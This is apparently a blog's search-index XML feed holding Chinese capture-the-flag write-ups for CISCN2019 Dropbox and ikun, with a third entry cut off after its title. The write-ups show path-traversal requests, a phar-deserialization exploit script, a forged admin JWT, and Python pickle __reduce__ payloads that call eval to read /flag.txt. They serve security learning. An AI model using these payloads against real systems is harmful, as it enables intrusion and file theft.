<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
      <link href="/2020/04/27/Web1-Dropbox/"/>
      <url>/2020/04/27/Web1-Dropbox/</url>
      
        <content type="html"><![CDATA[<p>在下载界面抓包更改filename参数进行post传值为<code>../../index.php(delet.php,download.php,class.php)</code> 分别可得到这几个页面的源码。</p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>下面为class.php几个类的部分源码。</p><p>user类在销毁时会调用close()函数。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>FileList类没有close函数，但在销毁时会遍历打印出results里的内容。__call方法：当程序调用到当前类中未声明或没权限调用的方法时，就会调用call方法，call方法内的代码在遍历把func里的新内容加到(按顺序跟到原来的后面)原来的funcs数组里。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();              <span class="comment">//创建了一个file对象。</span></span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>file类的close函数可以读取文件。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>根据这些源码，可以构思。我们可以new一个user类，将它的db变量设为一个FileList对象。当user在销毁时就会调用db变量执行close方法。但db变量是一个FileList对象它没有close方法，FileList对象在创建时会执行__construct方法，通过这个方法下的代码我们知道它会new一个file对象，所以此时就会执行file的close方法进行文件读取。之后继续在类FileList里找close方法，找不到就会执行call魔术方法，该方法把文件读取后的内容遍历放到了result里，最终销毁FileList对象时执行destruct方法，将result里的内容循环遍历到table里打印到屏幕上，此时flag打印出。</p><h4 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h4><p>这里需要利用到phar://伪协议。</p><p>phar文件中meta-data部分是以序列化的形式储存的。但php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化。进而反序列化执行了meta-data内的内容。受影响的函数有这些：</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox/image-20200427163810070.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:67%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox/image-20200427163810070.png" class="lazyload"></a><p>本题的file_get_contenes就在里面。构造phar文件，将flag文件读取操作自定义到meta-data部分。</p><p>注意：生成phar文件时需要更改php-ini中phar.readonly选项将选项前的分号去掉再设置为Off。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// add object of any class as meta data</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $filename=<span class="string">'/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=<span class="keyword">new</span> User();</span><br><span class="line">$c-&gt;db=<span class="keyword">new</span> FileList();</span><br><span class="line">    </span><br><span class="line"> <span class="comment">// create new Phar</span></span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);<span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($c); <span class="comment">////将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>, <span class="string">'text'</span>);   <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>生成一个phar文件后。上传文件，抓包改Content-Type为image/jpeg改文件后缀为jpg。上传。</p><p>在delet页面抓包利用phar伪协议进行反序列化操作读取flag。为什么不在download页面进行呢，看源码。它过滤了文件名为flag的文件。所以无法读取。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//download部分源码</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>delete并没有对filename进行限制，只是进行简单判断但均会返回响应包。所以我们在delete页面用phar伪协议进行反序列化操作。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//delete部分源码</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">$file = <span class="keyword">new</span> File();     <span class="comment">//调用file对象执行文件读取时就会进行phar文件内mate-data部分的反序列化</span></span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在删除时抓包修改filename：<code>phar://test.gif</code>  返回参数中找到flag</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox/image-20200427174723359.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox/image-20200427174723359.png" class="lazyload"></a><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">参考：phar 拓展 php 反序列化漏洞攻击面</a></p><p><a href="https://xz.aliyun.com/t/2715" target="_blank" rel="noopener">参考：phar伪协议</a></p><p>该漏洞的利用条件：</p><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><p>本题主要是要先通过审计代码找到各个类之间魔术方法的利用点。利用phar文件将我们的操作作为mata-data部分序列化。利用<code>phar://</code>伪协议和file_get_contenes函数在php解析时触发反序列化进而执行mata-data部分得到flag。想到利用phar文件进行反序列化攻击漏洞的点应该就是<code>file_get_contenes</code>函数，只有它存在才能触发伪协议进行反序列化。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 华北赛区 Day1 Web2]ikun</title>
      <link href="/2020/04/27/Web2-ikun/"/>
      <url>/2020/04/27/Web2-ikun/</url>
      
        <content type="html"><![CDATA[<p>好像是需要买东西，但是钱不够的样子。根据网页提示需要购买到LV6</p><p>页数太多写脚本找。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://ea5c0046-1742-4094-9981-41272403d3cb.node3.buuoj.cn/shop?page="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">    r = requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><p>在181页，注册一个账号登录一下。钱不够购买使用burp抓包改折扣也不可以。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422113842173.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom: 50%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422113842173.png" class="lazyload"></a><p>得到一个新地址（/b1g_m4mber)，访问提示只有管理员可以访问，但在注册的时候试过admin账号被禁止注册。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422114032714.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:50%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422114032714.png" class="lazyload"></a><p>看wp了解到了jwt的加密方式。该页面通过jwt验证登录。</p><p>JSON Web Token（JWT）由三部分组成用.连接，分别是header，payload，signature。前两部分通过base64编码进行加密，第三部分需要破解。<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">破解工具</a></p><p>对前两部分进行解码：</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422112923633.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:50%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422112923633.png" class="lazyload"></a><p>第二部分可以看到我的用户名。</p><p>可知道要构造新的jwt改为admin用户就可以通过验证。开始破解密匙。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422115019152.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom: 67%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422115019152.png" class="lazyload"></a><p>密匙：1kun。</p><p>构造jwt （网站一直打不开。。。</p><p><a href="https://jwt.io/" target="_blank" rel="noopener">构造jwt网站</a></p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422120826960.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom: 50%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422120826960.png" class="lazyload"></a><p>jwt: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422154925109.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:50%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422154925109.png" class="lazyload"></a><p>进来了，啥都点不动，就看源码。提示有下载。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422155506123.png" data-fancybox="group" data-caption="image-20200422155506123" class="fancybox"><img alt="image-20200422155506123" style="zoom:67%;" title="image-20200422155506123" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422155506123.png" class="lazyload"></a><p>找到Admin.py</p><p><strong>loads函数有反序列化操作并且操作的become参数可控。</strong></p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422160201617.png" data-fancybox="group" data-caption="image-20200422160201617" class="fancybox"><img alt="image-20200422160201617" style="zoom:67%;" title="image-20200422160201617" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422160201617.png" class="lazyload"></a><p><a href="https://blog.csdn.net/yanghuan313/article/details/65010925" target="_blank" rel="noopener">python序列化和反序列化存在的缺陷</a></p><p>只要反序列化的输入可控，就能在进行反序列化时达到任意代码执行。这里需要用到 <code>__reduce__</code> 魔术方法，该方法在每次进行pickle 时就会被调用它可以返回一个字符串或者是元组。</p><p>如果返回值是一个字符串，那么将会去查找字符串值对应名字的对象，将其序列化之后返回。如果返回值是元组（2到5个参数），第一个参数是可调用（callable）的对象，第二个是该对象所需的参数元组，剩下三个可选。</p><p>在不知道要读取的是flag.txt的情况下，尝试用命令列出所有文件。</p><p>os.listdir(‘’)  列出指定目录下的所有文件和子目录，包括隐藏文件，并以列表方式打印</p><p>试过ls指令，不会回显。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.listdir,(<span class="string">'/'</span>,))  //查看根目录</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure></div><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422171448862.png" data-fancybox="group" data-caption="image-20200422171448862" class="fancybox"><img alt="image-20200422171448862" style="zoom: 80%;" title="image-20200422171448862" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422171448862.png" class="lazyload"></a><p>抓包更换become的值。得到文件列表。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422170048942.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:50%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422170048942.png" class="lazyload"></a><p>有flag.txt 文件，读取。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))  //打开并读取</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure></div><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422171720659.png" data-fancybox="group" data-caption="image-20200422171720659" class="fancybox"><img alt="image-20200422171720659" style="zoom:67%;" title="image-20200422171720659" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/image-20200422171720659.png" class="lazyload"></a><p>更换become值后读取成功。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这题收获很大主要了解到了jwt的加密方式还有可以通过破解密匙伪造新的身份来通过验证。还有了解到了python的序列化与反序列化的利用方式在构造序列化payload时利用到<code>__reduce__</code>魔术方法进行文件读取。通过几个payload获得了解了一些python模块。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[安洵杯2019]easy_web</title>
      <link href="/2020/04/27/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy-web/"/>
      <url>/2020/04/27/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy-web/</url>
      
